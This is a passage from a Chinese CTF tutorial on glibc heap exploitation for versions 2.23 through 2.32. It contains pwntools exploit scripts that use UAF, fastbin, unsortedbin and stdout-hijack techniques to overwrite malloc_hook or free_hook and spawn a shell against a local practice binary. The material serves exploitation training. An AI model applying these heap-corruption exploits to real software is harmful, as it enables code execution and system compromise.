path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.25\" in path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.26\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.27\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.28\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.29\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.30\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.31\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.32\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.33\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telse:\n\t\tprint(\"Version Wrong!\")\n\t\tquit()\n\treturn heap_base\n\ndef leak_elf():\n\tru(\"Gift_elf:0x\")\n\tLeak = int(rc(12),16)\n\tlog.info(\"LeakElf:0x%x\"%Leak)\n\treturn Leak\n\ndef leak_libc():\n\tru(\"Gift_Libc:0x\")\n\tLeak = int(rc(12),16)\n\tlog.info(\"LeakLibc:0x%x\"%Leak)\n\treturn Leak\n\ndef getMain_arena(libc_base):\n\treturn libc_base+libc.sym['__malloc_hook']+0x10\n\ndef getOnegadget():\n    originStr=commands.getstatusoutput('one_gadget ' + context.binary.libc.path)[1]\n    print originStr\n    one_gadget = []\n    lstKey = [] \n    lengthKey = 0\n    key = 'execve'\n    countStr = originStr.count(key)\n    if countStr < 1:\n        print('No one_gadget')\n    elif countStr == 1: #only one one_gadget\n        indexKey = originStr.find(key)\n        one_gadget.append(int(originStr[indexKey-8:indexKey-1],16))\n        return one_gadget\n    else: #multiple one_gadgey\n        indexKey = originStr.find(key)\n        lstKey.append(indexKey) \n        while countStr > 1:\n            str_new = originStr[indexKey+1:len(originStr)+1]\n            indexKey_new = str_new.find(key)\n            indexKey = indexKey+1 +indexKey_new\n            lstKey.append(indexKey)\n            countStr -= 1\n        for i in range(len(lstKey)):\n            one_gadget.append(int(originStr[(lstKey[i]-8):lstKey[i]-1],16))\n        return one_gadget\n\n    \ndef pwn():\n    heap_base = leak_heap()\n    libc_base = leak_libc() - libc.sym['printf']\n    elf_base = leak_elf() - elf.sym['main']\n    log.info(\"heap_base:0x%x\"%heap_base)\n    log.info(\"libc_base:0x%x\"%libc_base)\n    log.info(\"elf_base:0x%x\"%elf_base)\n    add_malloc(0x1000-0x290-0x8,'PIG007NB')\n\n    \n    \ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n\n\n# 二、环境搭建\n\n## 前言\n\n众所周知，pwn的Glibc环境向来是一个难解题，很多大佬在编译不同版本的Glibc都很头疼，一个不注意就容易出错。像Github上的`glibc-all-in-one`搭配`patchelf`\n\n`glibc-all-in-one`:[matrix1001/glibc-all-in-one: 🎁A convenient glibc binary and debug file downloader and source code auto builder (github.com)](https://github.com/matrix1001/glibc-all-in-one)\n\n`patchelf`:[NixOS/patchelf: A small utility to modify the dynamic linker and RPATH of ELF executables (github.com)](https://github.com/NixOS/patchelf)\n\n对于很多人来说搞个虚拟机编译环境一个包没装好就容易挂掉，然后就GG，这实在是很浪费生命的一件事情。而`patchelf`其实有时候也不太顶用，还有`Docker`里的\n\n`pwnDocker`:[skysider/pwndocker - Docker Image | Docker Hub](https://hub.docker.com/r/skysider/pwndocker)\n\n其实有时候也感觉不太好用，而且需要依靠作者更新，自己编译也容易出错。但是这倒是激发了我一个想法，为每个Libc版本搭建个docker容器，然后通过映射关系将题目映射进容器中，相当于只需要容器中的libc环境，这样就不需要考虑这些东西了。\n\n## 项目\n\n经过大量测试，自己写了一个小项目，适合所有Libc版本，只要docker hub中有对应libc版本的ubuntu容器，该容器对应的apt源还有在更新，就能用，跟自己本身环境没啥关系。实测所有版本都行，一键搭建，一键使用：\n\nGithub:[PIG-007/pwnDockerAll (github.com)](https://github.com/PIG-007/pwnDockerAll)\n\nGitee:[PIG-007/pwnDockerAll (gitee.com)](https://gitee.com/Piggy007/pwnDockerAll)\n\n详情看项目里。\n\n\n\n# 三、Glibc2.23\n\n## 1.UAF + Leak + Size不做限制：\n\n这种情况直接free进unsortedbin泄露地址，然后打fastbin attack，借助0x7f字节错位劫持malloc_hook即可，没啥技术含量。这里再说一些，其实0x56也是可以的，可以借助unsortedbin attack将堆地址写到一个地方然后字节错位也是可以的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-16_15-16-03.png)\n\n0x7f：0111 1**11**1\n\n0x56：0101 0**11**0\n\n主要看的是AM位，加粗的两位，不能刚好是10，检测：\n\n(1)是否属于当前线程的main_arena\n\n(2)是否是mmap出来的chunk的检测\n\n所以按照道理来讲，尾数为4 5 c d四个系列不能通过检测，其他都可以的。而对于堆地址的随机性，0x56和0x55都是可能的，所以也不一定成功，同样需要爆破。\n\n```python\n#注释头\n\none_gadget = getOnegadget()\nadd_malloc(0x418,'PIG007NB')\nadd_malloc(0x68,'PIG007NB')\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(88 + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nfree(2)\nedit(2,0x8,p64(libc_base + libc.sym['__malloc_hook']-0x23))\nadd_malloc(0x68,'PIG007NB')\n\nfor i in range(len(one_gadget)):\n    lg(\"one_gadget[\"+str(i)+\"]\",libc_base+one_gadget[i])\nadd_malloc(0x68,'\\x00'*0x13+p64(libc_base+one_gadget[]))\n#add_malloc(0x18,'PIG007NB')\np.sendline('1')\np.sendline('1')\np.sendline('1')\np.interactive()\n```\n\n需要注意的是这里由于覆写了_IO_wide_data部分数据，有些数据可能打印不出来，直接一股脑发送信息申请堆块即可。至于one_gadget没办法用的，参照realloc_hook调整栈帧。\n\n## 2.UAF + Leak + size限制\n\n▲比如说size限制不能申请0x70大小的堆块，那么就没办法字节错位申请malloc_hook的地方。一般来说有以下几种情况：\n\n(1)只能是小Chunk，即0x20~0x80：\n\n泄露heap地址，修改FD，指向上一个chunk来修改size，释放进入unsortedbin后泄露得到libc地址，之后再借用0x7f的UAF字节错位申请即可到malloc_hook即可。\n\n(2)只能是中等的chunk，大于fatsbin小于largebin的，即0x90~0x3f0。\n\n泄露地址后，直接用unsortedbin attack，修改global_max_fast，然后利用fastbinY链在main_arean上留下size，申请过去修改top_chunk为malloc_hook-0x10或者malloc_hook-0x28，修复unsortedbin之后即可任意修改。\n\n```python\n#注释头\n\none_gadget = getOnegadget()\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr = main_arena + 80\nidx = (target_addr - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(size-0x8,'PIG007NB')\nadd_malloc(0x2f8,'PIG007NB')\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(0xf8,'PIG007NB')\n\nfree(2)\nshow(2)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nmain_arena = libc_base + libc.sym['main_arena']\ntarget_addr = libc_base+libc.sym['global_max_fast']\n\nedit(2,0x18,p64(0x0)+p64(target_addr-0x10))\nadd_malloc(0x2f8,'\\x00')\n\nfree(1)\nedit(1,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\n\nfree(3)\nedit(3,0x8,p64(libc_base + libc.sym['main_arena'] + 0x48))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(malloc_hook-0x28)+p64(0x0)+p64(main_arena+88)*2)\nadd_malloc(0x98,p64(0x0)*2+p64(libc_base + one_gadget[1])+p64(libc_base+libc.sym['realloc']+8))\np.sendline('1')\np.sendline('1')\np.sendline('1')\nit()\n```\n\n这里就利用realloc调整了一下栈帧\n\n(3)只能是大chunk，即0x400~...\n\n泄露地址后，直接用unsortedbin attack，修改global_max_fast，之后利用fastbinY机制可在free_hook附近伪造堆size，然后申请过去修改free_hook为system，释放堆块即可。\n\n```python\n#注释头\n\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr_binsY = libc.sym['__free_hook']-0x10\nidx = (target_addr_binsY - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx1\nadd_malloc(0x4f8,'/bin/sh\\x00')\t\t#idx2\n\nadd_malloc(size-0x8,'PIG007NB')\t\t#idx3\nadd_malloc(size+0x10-0x8,'PIG007NB')\t#idx4\n\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\n\ntarget_addr = libc_base+libc.sym['global_max_fast']\nlog.info(\"target_addr:0x%x\"%target_addr)\n#change unsortedBinchunkA\n#chunkA.fd could be anything\n\nedit(1,0x4f8,p64(0x0)+p64(target_addr-0x10)) \n#have to malloc all from unsortedbin\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx4\nfree(3)\nedit(3,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\nfree(4)\nedit(4,0x8,p64(libc_base + target_addr_binsY -0x8))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\nfree(2)\nit()\n```\n\n(4)只能是某个特定大小的chunk，比如只能是0x40，0x60，一般不会只能是一个大小的，不然基本无法利用。\n\n泄露地址heap地址后，修改size位进入unsortedbin中，再泄露libc地址。由于无法0x56和0x7f字节错位利用，所以只能利用一个size的bin，释放之后在fastbinY中留下size，然后另一个size申请过去，修改top_chunk到malloc_hook处即可，之后类似。\n\n详情参照CISCN东北赛区复现中的题目small_chunk。\n\n## 3.UAF + 无Leak + Size不做限制\n\n▲无Leak通常需要爆破，同样用unsortedbin attack部分写unsortedbin中chunk的bk指针，修改global_max_fast，之后利用fastbinY机制劫持_IO_2_1_stdout_结构体，泄露出地址，然后就和之前一样，再利用fastbinY机制劫持free_hook即可。\n\n```python\n#注释头\n\ndef pwn():\n\t#one_gadget = getOnegadget()\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\n\tadd_malloc(0x1000-0x8,'PIG007NB')\n\n\t#prepare data-----------------------------------------------------------\n\tguess_libc = 0x9000\n\tguess_heap = 0x2000\n\tfastbinsY = guess_libc + libc.sym['main_arena'] + 8\n\t_IO_read_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x10\n\t_IO_write_base = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x20\n\t_IO_write_ptr = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x28\n\t_IO_write_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x30\n\n\tidx_read_end = (_IO_read_end - fastbinsY) / 8\n\tsize_read_end = idx_read_end * 0x10 + 0x20\n\n\tidx_write_base = (_IO_write_base - fastbinsY) / 8\n\tsize_write_base = idx_write_base * 0x10 + 0x20\n\n\tidx_write_ptr = (_IO_write_ptr - fastbinsY) / 8\n\tsize_write_ptr = idx_write_ptr * 0x10 + 0x20\n\n\tidx_write_end = (_IO_write_end - fastbinsY) / 8\n\tsize_write_end = idx_write_end * 0x10 + 0x20\n\n\ttarget_addr_gMF = guess_libc + libc.sym['global_max_fast']\n\n\tfastbinsY = libc.sym['main_arena'] + 8\n\ttarget_addr_binsY = libc.sym['__free_hook']-0x10\n\tidx_free_hook = (target_addr_binsY - fastbinsY) / 8\n\tsize_free_hook = idx_free_hook * 0x10 + 0x20\n\n\t#read_end-------------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x1\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x2  point free  read_end\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0x3\n\tadd_malloc(0x38,'\\x04'*0x18+p64(0x21)+'\\x04'*0x18)\t\t#idx\t0x4\n\n\tfree(0x1)\n\t#free(2)\n\tfree(0x3)\n\tedit(0x3,0x1,'\\x20')\n\tedit(0x1,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x05'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0x5\n\tadd_malloc(0x38,'\\x06'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0x6 #point change size\n\t#---------------------------------------------------------------------\n\n\n\t#write_end can not be so far from wirte_base\n\tadd_malloc(size_write_end-0x8,(p64(0x0)+p64(0x21))*((size_write_end-0x10)/0x10))\t\t\t\t#idx\t0x7\n\tadd_malloc(size_write_ptr-0x8,(p64(0x0)+p64(0x21))*((size_write_ptr-0x10)/0x10))\t\t\t\t#idx\t0x8\n\n\n\t#write_base-----------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x9\n\tadd_malloc(0x38,\"\\xaa\"*0x38)\t\t\t\t#idx\t0xa\n\tadd_malloc(0x38,\"\\x0b\"*0x38)\t\t\t\t#idx\t0xb\n\tadd_malloc(0x38,'\\x0c'*0x18+p64(0x21)+'\\xaa'*0x18)\t\t#idx\t0xc\n\n\tfree(0x9)\n\t#free(2)\n\tfree(0xb)\n\tedit(0xb,0x2,p16((guess_heap+0x1000+0x40)&0xffff))\n\tedit(0x9,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x0d'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0xd\n\tadd_malloc(0x38,'\\x0e'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0xe #point free\n\t#---------------------------------------------------------------------\n\n\n\n\t#prepare for free_hook\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\t\t\t#idxf\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\t\t#idx10\n\n\n\t#unsortedbin attack\n\tadd_malloc(0x4f8,'\\x11'*0x4f8)\t\t\t#idx 0x11\n\tadd_malloc(0x38,'\\x12'*0x38)\t\t\t#idx 0x12\n\tfree(0x11)\n\tedit(0x11,0x8+0x2,p64(0x0)+p16((target_addr_gMF&0xffff)-0x10))\n\tadd_malloc(0x4f8,'/bin/sh\\x00')\t\t\t#idx 0x13\n\n\n\n\t#change write_base \n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_write_base+1))\n\tfree_m(0xe)\n\n\n\t#change write_end and write_ptr\n\tfree_m(0x7)\n\tfree_m(0x8)\n\n\n\t#change read_end\n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_read_end+1))\n\tfree_m(0x2)\n\n\tlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\tlg(\"libc_base\",libc_base)\n\n\t#write free_hook - 0x10\n\tfree(0xf)\n\n\t#left size\n\tedit(0xf,0x8,p64(size_free_hook+0x10+1))\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\n\n\t#get free_hook - 0x8\n\tfree(0x10)\n\tedit(0x10,0x8,p64(libc_base + target_addr_binsY -0x8))\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\n\tadd_malloc(size_free_hook+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\n\n\t#get shell\n\tfree(0x13)\n\tit()\n\n\n\n\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n▲通常需要注意的是，write_base和write_end不能相距太远，不然很容易数据量过大而崩溃。还有这里最后泄露地址是\n\nlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\n这是因为IO流的机制，会在写入数据的0x10处上写下libc.sym['_IO_2_1_stdout_']+131的地址，所以这里直接就能泄露。\n\n▲题外话：爆破的数学期望为1/256\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-17_18-07-31.png)\n\n## 4.UAF + 无Leak + Size做限制\n\n▲同样size做限制一般也分为以下几种\n\n(1)只能是小Chunk，即0x20~0x80：\n\n这个也是一样的，利用UAF部分写入heap_addr制造堆块重叠，修改size域，放入unsortedbin，然后部分写入libc_addr打unsortedbin attack修改global_max_fast，之后就类似了，劫持_IO_2_1_stdout泄露地址，fastbinY机制劫持main_arena，修复unsortedbin后改top_chunk劫持malloc_hook即可。\n\n(2)只能是中等的chunk，大于fatsbin小于largebin的，即0x90~0x3f0。\n\n类似，部分写修改size域打unsortedbin attack，修改global_max_fast，劫持_IO_2_1_stdout泄露地址。fastbinY机制劫持free_hook。\n\n(3)只能是大chunk，即0x400~...\n\n直接用部分写libc_addr打unsortedbin attack，修改global_max_fast，劫持_IO_2_1_stdout泄露地址，之后利用fastbinY机制可在free_hook附近伪造堆size，然后申请过去修改free_hook为system，释放堆块即可。\n\n(4)指定的chunk size。\n\n▲其实对于UAF来说，size做没做限制都差不了太多，因为都可以部分写堆块地址制造堆重叠，然后就能修改size域，唯一区分的就是申请时候的限制，小的就打top_chunk，大的就直接打_free_hook。比较有意思的一点就是限制特定size，一般限制为两个，以前遇到0x20和0x30，也有0x40和0x50的，都是大同小异，借用fastbinY机制留下size后申请过去即可。\n\n \n\n# 四、Glibc2.27\n\nUAF在这个版本下对于tcache实在是好用，由于tcache不检查size位，也不检查FD，只要泄露了地址，加上UAF就能实现任意申请。而对于无show功能的，既可以借助unsortedbin踩下地址后爆破直接申请，也可以unsortedbin attack劫持global_fast_max之后再劫持IO_2_1_stdout结构泄露地址。\n\n## 1.Sashing机制带来的改变\n\n### (1)加入的检查判断：\n\n需要注意的一点是，由于加入了tcache的stahing机制，所以在从fastbin中申请时会有一个判断：\n\n（**这个在2.26开始就存在的，只不过可能代码不太一样，所以有tcache的地方，fastbin修改fd从而在main_arena上留下fd的功能就无法使用了）**\n\n![Snipaste_2021-08-19_21-32-57](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108192133799.png)\n\n 由于tcache的stashing机制，如果从fastbin中取chunk，那么如果该大小的fastbin链中还有其他chunk，则会尝试将该大小的fastbin链中剩余的chunk都放入对应大小的tcache中，那么就会出现如上的对fastbin中的fd进行取出检查，这里我设置了fastbin中Chunk的fd为0x71，即rdx的值，导致出错。\n\n```c\n//注释头\n\n*fb = tc_victim->fd;\n\nmov    rax, qword ptr [rdx + 0x10]\n```\n\n这个代码以及汇编赋值，使得[rdx+0x10]，即取0x71的fd指针，那肯定会出错。同样的，如果修改fastbin中chunk的fd也不再是简单地伪造size了，还需要考虑对应FD的fd指针有效性。\n\n### (2)对抗利用：\n\n#### ①have_fastchunks:\n\n虽然FD不能留下伪造地址，但是可以释放一个chunk进入fastbin，将main_arena.have_fastchunks置1，之后利用main_arena.have_fastchunks留下的0x1在上面来申请0x100的字节错位，但是这个需要先修改global_max_fast才能申请0x100的fastbinChunk。\n\n![Snipaste_2021-08-27_14-48-12](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827144821.png)\n\n#### ④top_chunk:\n\n此外，借用爆破chunk地址，将top_chunk的0x56当作合法size也是可以的。\n\n![Snipaste_2021-08-27_14-42-24](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827144239.png)\n\n但是其实也没差，既然有tcache，那我还用fastbin申请干啥，直接tcache获得地址之后任意申请不就完了，除非全是calloc，但这种情况其实还有更方便的解法，即`house of banana`。所以要是碰到2.27版本的，简直就是烧高香了。\n\n## 2.Glibc2.27Tcache题外话：\n\n现今版本，2020年09月10日开始，从2.27-3ubuntu1.3开始，就已经对tcache做了部分修改，很接近2.29的，而现在的题目基本都是基于这种增强型版本的，已经不存在double free了。\n\n[Glibc 2.27关于Tcache的增强保护 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/219292#h2-2)\n\n新增如下：\n\n### (1)Key字段新增：\n\n```c\n/* We overlay this structure on the user-data portion of a chunk when\n   the chunk is stored in the per-thread cache.  */\ntypedef struct tcache_entry\n{\n    struct tcache_entry *next;\n    /* This field exists to detect double frees.  */\n    struct tcache_perthread_struct *key;\n} tcache_entry;\n```\n\n同样的对应tcache_put会加入key字段，tcache_get中会清除key字段，_int_free函数会**根据key字段**判断double free。\n\n这里讲个小技巧，如果发现题目的libc.so版本在2.27-3ubuntu1.3之下，那么就没有key字段，存在无限制的double free，直接搞定。而常规的2.28版本其实也还存在double free，查看_int_free相关源码即可发现。\n\n具体利用和绕过后面讲。\n\n### (2)Tcache数量限制\n\n```c\n#define MAX_TCACHE_COUNT 127    /* Maximum value of counts[] entries.  */\n```\n\n这个没发现有啥用，传统的只有2.30开始才用到了这个，低版本连定义都没有，除了这个增强型的2.27\n\n```c\n//2.30\n\ndo_set_tcache_count (size_t value)\n{\n    if (value <= MAX_TCACHE_COUNT)\n    {\n        LIBC_PROBE (memory_tunable_tcache_count, 2, value, mp_.tcache_count);\n        mp_.tcache_count = value;\n    }\n    return 1;\n}\n```\n\n这就很迷惑，通常定义的tcache_count是7，而这里却要求小于MAX_TCACHE_COUNT(127)，是因为GNU的其他功能可能会改变tcache的结构吗，比如将tcache_count修改为127，扩大tcache来使用吗，等待大佬发现漏洞。\n\n另外该文章中还说了realloc对应memcpy的使用修改，感觉没啥用。\n\n总的来说，其实就相当于将2.27的tcache增强成了2.29，其他的到没啥变化。\n\n\n\n# 五、Glibc2.29\n\n## 1.部分手段失效\n\n### (1)unsortedbin attack失效\n\n这个版本下的unsortedbin attck已经失效，原因是新增如下检查：\n\n```c\n#注释头\n\nmchunkptr next = chunk_at_offset (victim, size);\nif (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)\n    || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))\n    malloc_printerr (\"malloc(): invalid next size (unsorted)\");\nif (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))\n    malloc_printerr (\"malloc(): mismatching next->prev_size (unsorted)\");\nif (__glibc_unlikely (bck->fd != victim)\n    || __glibc_unlikely (victim->fd != unsorted_chunks (av)))\n    malloc_printerr (\"malloc(): unsorted double linked list corrupted\");\nif (__glibc_unlikely (prev_inuse (next)))\n    malloc_printerr (\"malloc(): invalid next->prev_inuse (unsorted)\");\n```\n\n①下一个chunk的size是否在合理区间\n\n②下一个chunk的prevsize是否等于victim的size\n\n③检查unsortedbin双向链表的完整性\n\n④下一个chunk的previnuse标志位是否为0\n\n其实最要命的是检查双向链表的完整性，还得在目的地址的fd伪造victim，都能伪造地址了还用这，所以直接废弃。Tcache_Stashing_Unlink_Attack来类似代替unsortedbin attack，不过Tcache_Stashing_Unlink_Attack一般需要用到calloc，如果有UAF泄露地址的话倒是不太需要。\n\n### (2)top_chunk改写限制\n\n新增检查：\n\n```C\n#注释头\n\nif (__glibc_unlikely (size > av->system_mem))  //0x21000        \n    malloc_printerr (\"malloc(): corrupted top size\");\n```\n\n即size需要小于等于system_mems = 0x21000。之前由top_chunk引发的一系列漏洞，类似House of orange,\n\nHouse of Force以及之前提到的修改top_chunk到malloc_hook附近等，都不太行了。\n\n### (3)unlink方面一些限制\n\n新增检查：\n\n```c\n#注释头\n\nif(__glibc_unlikely (chunksize(p) != prevsize))\t*//new*        \n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\n即会判断找到的之前为Free状态的chunk和当前要释放chunk的prevsize是否相等\n\n这个对于UAF方面来说没啥影响，因为UAF本身就基本直接造成堆块重叠，而unlink通常就是结合off-by-null来制造堆块重叠的。off-by-null和off-by-one之后开一个专门的来讨论。\n\n### (4)tcache方面的变化\n\n#### ①新增key字段\n\n```c\n#注释头\n\ntypedef struct tcache_entry\n{\n    struct tcache_entry *next;\n    /* This field exists to detect double frees.  */\n    struct tcache_perthread_struct *key;\n} tcache_entry;\n\n//-------------------------------------------------------------------------------\n\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n    assert (tc_idx < TCACHE_MAX_BINS);\n\n    /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n    e->key = tcache;\t//add\n\n    e->next = tcache->entries[tc_idx];\n    tcache->entries[tc_idx] = e;\n    ++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    assert (tc_idx < TCACHE_MAX_BINS);\n    assert (tcache->entries[tc_idx] > 0);\n    tcache->entries[tc_idx] = e->next;\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\t//add\n    return (void *) e;\n}\n\n\n```\n\n即会在释放chunk的bk处加入key字段，一般为heap_base+0x10，即当前线程的tcache struct的地方。释放时赋值，申请回来时置零。\n\n#### ②新增的一些检查\n\n```c\n//注释头\n\n{\n    size_t tc_idx = csize2tidx (size);\n    if (tcache != NULL && tc_idx < mp_.tcache_bins)\n    {\n        /* Check to see if it's already in the tcache.  */\n        tcache_entry *e = (tcache_entry *) chunk2mem (p);\n\n        /* This test succeeds on double free.  However, we don't 100%\n   trust it (it also matches random payload data at a 1 in\n   2^<size_t> chance), so verify it's not an unlikely\n   coincidence before aborting.  */\n        if (__glibc_unlikely (e->key == tcache))\n        {\n            tcache_entry *tmp;\n            LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);\n            for (tmp = tcache->entries[tc_idx];\n                 tmp;\n                 tmp = tmp->next)\n                if (tmp == e)\n                    malloc_printerr (\"free(): double free detected in tcache 2\");\n            /* If we get here, it was a coincidence.  We've wasted a\n       few cycles, but don't abort.  */\n        }\n\n        if (tcache->counts[tc_idx] < mp_.tcache_count)\n        {\n            tcache_put (p, tc_idx);\n            return;\n        }\n    }\n}\n```\n重点是这里**if (__glibc_unlikely (e->key == tcache))**，即针对之前tcache dup做的限制，检查要释放chunk的key字段，如果等于tcache结构体地址，则遍历对于的tcache中的chunk是否和该chunk为同一个chunk，是则报错。这个好绕过，通常可以利用漏洞改掉tcache中对于chunk的bk指针即可。由于unsortedbin attack失效，而Tcache_Stashing_Unlink_Attack通常还需要结合堆溢出，UAF之类的漏洞，所以常常可以**配合largebin attack来进行攻击tcache dup。**\n\n▲还有一点需要注意的是，有的2.27版本已经引入了2.29中的一些机制，刚刚提到的，比如key字段之类的，具体做题具体分析。\n\n参考：[glibc-2.29新增的保护机制学习总结 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/194960#h2-1)\n\n#### ③出现的新手段\n\nTcache stash unlink attack，很多师傅分析这个漏洞都是在2.29下开始分析，但实际上从最开始引入2.26的tcache就已经有了，只不过可能是之前的unsortedbin attack太好用，就没开发出来这个漏洞。\n\n```c\n//2.26  \n\nif (in_smallbin_range (nb))\n{\n    idx = smallbin_index (nb);\n    bin = bin_at (av, idx);\n\n    if ((victim = last (bin)) != bin)\n    {\n        if (victim == 0) /* initialization check */\n            malloc_consolidate (av);\n        else\n        {\n            bck = victim->bk;\n            if (__glibc_unlikely (bck->fd != victim))\n            {\n                errstr = \"malloc(): smallbin double linked list corrupted\";\n                goto errout;\n            }\n            set_inuse_bit_at_offset (victim, nb);\n            bin->bk = bck;\n            bck->fd = bin;\n\n            if (av != &main_arena)\n                set_non_main_arena (victim);\n            check_malloced_chunk (av, victim, nb);\n\n            #if USE_TCACHE\n            /* While we're here, if we see other chunks of the same size,\n\t     stash them in the tcache.  */\n            size_t tc_idx = csize2tidx (nb);\n            if (tcache && tc_idx < mp_.tcache_bins)\n            {\n                mchunkptr tc_victim;\n\n                /* While bin not empty and tcache not full, copy chunks over.  */\n                while (tcache->counts[tc_idx] < mp_.tcache_count\n                       && (tc_victim = last (bin)) != bin)\n                {\n                    if (tc_victim != 0)\n                    {\n                        bck = tc_victim->bk;\n                        set_inuse_bit_at_offset (tc_victim, nb);\n                        if (av != &main_arena)\n                            set_non_main_arena (tc_victim);\n                        bin->bk = bck;\n                        bck->fd = bin;\n\n                        tcache_put (tc_victim, tc_idx);\n                    }\n                }\n            }\n\n            #endif\n            void *p = chunk2mem (victim);\n            alloc_perturb (p, bytes);\n            return p;\n        }\n    }\n}\n\n\n//2.32\nif (in_smallbin_range (nb))\n{\n    idx = smallbin_index (nb);\n    bin = bin_at (av, idx);\n\n    if ((victim = last (bin)) != bin)\n    {\n        if (victim == 0) /* initialization check */\n            malloc_consolidate (av);\n        else\n        {\n            bck = victim->bk;\n            if (__glibc_unlikely (bck->fd != victim))\n            {\n                errstr = \"malloc(): smallbin double linked list corrupted\";\n    